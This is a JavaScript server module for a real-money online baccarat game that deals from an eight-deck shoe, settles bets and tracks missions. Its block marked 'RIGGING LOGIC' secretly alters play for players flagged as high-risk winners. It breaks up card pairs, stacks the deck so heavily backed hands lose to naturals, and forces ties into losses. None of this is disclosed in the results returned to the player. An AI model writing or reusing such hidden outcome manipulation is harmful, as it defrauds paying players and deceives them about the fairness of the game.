
const crypto = require('crypto');
const { User } = require('../../models');
const { processTransaction, saveGameLog } = require('../modules/TransactionManager');
const { calculateRisk } = require('../modules/RiskEngine');
const { AchievementSystem } = require('../modules/AchievementSystem');
const { MissionSystem } = require('../modules/MissionSystem'); 
const { secureShuffle, secureRandomFloat, logGameResult } = require('../../utils');
const BaccaratRules = require('../baccaratRules');

// Helper: Calculate ROI String
const getRoiString = (user, currentBet, currentPayout) => {
    if (user.totalDeposits > 0) return (((user.balance - user.totalDeposits) / user.totalDeposits) * 100).toFixed(2) + '%';
    const totalWagered = (user.stats?.totalWagered || 0) + currentBet;
    const totalWon = (user.stats?.totalWonAmount || 0) + currentPayout;
    return totalWagered > 0 ? (((totalWon - totalWagered) / totalWagered) * 100).toFixed(2) + '% (Test)' : '0.00% (Test)';
};

const deal = async (userId, bets) => {
    const totalBet = Object.values(bets).reduce((a, b) => a + (b || 0), 0);
    if (totalBet < 1) throw new Error("Aposta mínima é R$ 1.00");

    const userFetch = await User.findById(userId);
    if (totalBet > userFetch.balance) throw new Error("Saldo insuficiente");

    // Mission Trigger: Betting
    const missionBet = await MissionSystem.updateProgress(userId, { type: 'BET', amount: totalBet });
    let completedMissions = missionBet.completedMissions || [];
    let currentAllMissions = missionBet.allMissions || [];

    let user = await processTransaction(userId, -totalBet, 'BET', 'BACCARAT');
    const risk = calculateRisk(user, totalBet);
    let engineAdjustment = null;

    const SUITS = ['♥', '♦', '♣', '♠']; const RANKS = ['2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K', 'A'];
    let deck = []; 
    for(let i=0;i<8;i++) for(let s of SUITS) for(let r of RANKS) { 
        let val = parseInt(r); if(['10','J','Q','K'].includes(r)) val = 0; if(r === 'A') val = 1;
        deck.push({rank:r, suit:s, value: val, id:crypto.randomBytes(4).toString('hex')}); 
    }
    secureShuffle(deck);

    // --- RIGGING LOGIC START (Preserved) ---
    const isRisk = risk.level === 'HIGH' || risk.level === 'EXTREME';
    if (isRisk && ((bets.PAIR_PLAYER || 0) > 0 || (bets.PAIR_BANKER || 0) > 0)) {
        for (let i = 0; i < 3; i++) {
            if (deck[i].rank === deck[i+1].rank) {
                const swapIdx = deck.findIndex((c, idx) => idx > 4 && c.rank !== deck[i].rank);
                if (swapIdx !== -1) { [deck[i+1], deck[swapIdx]] = [deck[swapIdx], deck[i+1]]; engineAdjustment = 'PAIR_BREAKER'; }
            }
        }
    }
    const playerBet = bets.PLAYER || 0; const bankerBet = bets.BANKER || 0;
    const rigChance = risk.level === 'EXTREME' ? 0.70 : 0.40;
    const shouldRig = isRisk && (secureRandomFloat() < rigChance);

    if (shouldRig) {
        if (playerBet > bankerBet * 2) {
            const nines = deck.filter(c => c.value === 9 || c.value === 8); const lows = deck.filter(c => c.value < 5);
            if (nines.length >= 2 && lows.length >= 2) {
                const b1 = nines[0]; const b2 = deck.find(c => c.value === 0) || nines[1]; 
                const p1 = lows[0]; const p2 = lows[1]; 
                const newTop = [b2, p2, b1, p1];
                const filteredDeck = deck.filter(c => !newTop.includes(c));
                deck = [...filteredDeck, ...newTop]; 
                engineAdjustment = 'NATURAL_KILLER_BANKER';
            }
        } else if (bankerBet > playerBet * 2) {
            const nines = deck.filter(c => c.value === 9); const faces = deck.filter(c => c.value === 0);
            if (nines.length > 0 && faces.length > 0) {
                const p1 = nines[0]; const p2 = faces[0]; 
                const b1 = faces[1] || deck.find(c => c.value===1); const b2 = faces[2] || deck.find(c => c.value===2);
                const newTop = [b2, p2, b1, p1];
                const filteredDeck = deck.filter(c => !newTop.includes(c));
                deck = [...filteredDeck, ...newTop];
                engineAdjustment = 'NATURAL_KILLER_PLAYER';
            }
        }
    }
    // --- RIGGING LOGIC END ---

    let simulation = BaccaratRules.simulateGame([...deck]); 
    
    if (risk.level === 'EXTREME' && simulation.winner === 'TIE' && (bets.TIE || 0) > 0) {
        const p2 = simulation.pHand[1]; const newCard = deck.find(c => c.value !== p2.value);
        if(newCard) {
            simulation.pHand[1] = newCard;
            simulation.pScore = (simulation.pScore - p2.value + newCard.value + 10) % 10;
            simulation.winner = simulation.pScore > simulation.bScore ? 'PLAYER' : 'BANKER';
            engineAdjustment = 'TIE_BREAKER_FORCED';
        }
    }

    const calculatePayout = (simResult, userBets) => {
        let win = 0; const w = simResult.winner; 
        if (w === 'PLAYER') win += (userBets.PLAYER || 0) * 2;
        if (w === 'BANKER') win += (userBets.BANKER || 0) * 1.95;
        if (w === 'TIE') { win += (userBets.TIE || 0) * 9; win += (userBets.PLAYER || 0); win += (userBets.BANKER || 0); }
        const pPair = simResult.pHand[0].rank === simResult.pHand[1].rank;
        const bPair = simResult.bHand[0].rank === simResult.bHand[1].rank;
        if (pPair) win += (userBets.PAIR_PLAYER || 0) * 12;
        if (bPair) win += (userBets.PAIR_BANKER || 0) * 12;
        return win;
    };

    const finalPayout = calculatePayout(simulation, bets);

    if (finalPayout > 0) {
        user = await processTransaction(user._id, finalPayout, 'WIN', 'BACCARAT');
        
        // Mission Triggers
        const m1 = await MissionSystem.updateProgress(userId, { type: 'WIN', amount: finalPayout - totalBet });
        const m2 = await MissionSystem.updateProgress(userId, { gameEvent: 'BACCARAT_WIN', value: 1 });
        completedMissions = [...completedMissions, ...m1.completedMissions, ...m2.completedMissions];
        if (m2.allMissions) currentAllMissions = m2.allMissions;
        else if (m1.allMissions) currentAllMissions = m1.allMissions;

        await User.updateOne({ _id: user._id }, { lastBetResult: 'WIN', previousBet: totalBet, activeGame: { type: 'NONE' }, $inc: { consecutiveWins: 1 }, $set: { consecutiveLosses: 0 } });
    } else {
        await User.updateOne({ _id: user._id }, { lastBetResult: 'LOSS', previousBet: totalBet, activeGame: { type: 'NONE' }, $inc: { consecutiveLosses: 1 }, $set: { consecutiveWins: 0 } });
    }

    const currentRoi = getRoiString(user, totalBet, finalPayout);
    logGameResult('BACCARAT', user.username, finalPayout - totalBet, user.sessionProfit, risk.level, engineAdjustment, currentRoi);
    saveGameLog(user._id, 'BACCARAT', totalBet, finalPayout, { winner: simulation.winner, pScore: simulation.pScore, bScore: simulation.bScore }, risk.level, engineAdjustment, user.lastTransactionId).catch(console.error);
    
    // SAFE ACHIEVEMENT CHECK
    let newTrophies = [];
    if (AchievementSystem?.check) {
        newTrophies = await AchievementSystem.check(user._id, { game: 'BACCARAT', bet: totalBet, payout: finalPayout, extra: { winner: simulation.winner, isNatural: simulation.natural } });
    }

    return {
        pHand: simulation.pHand, bHand: simulation.bHand,
        pScore: simulation.pScore, bScore: simulation.bScore,
        winner: simulation.winner, payout: finalPayout,
        newBalance: user.balance, newTrophies, completedMissions, missions: currentAllMissions
    };
};

module.exports = { deal };
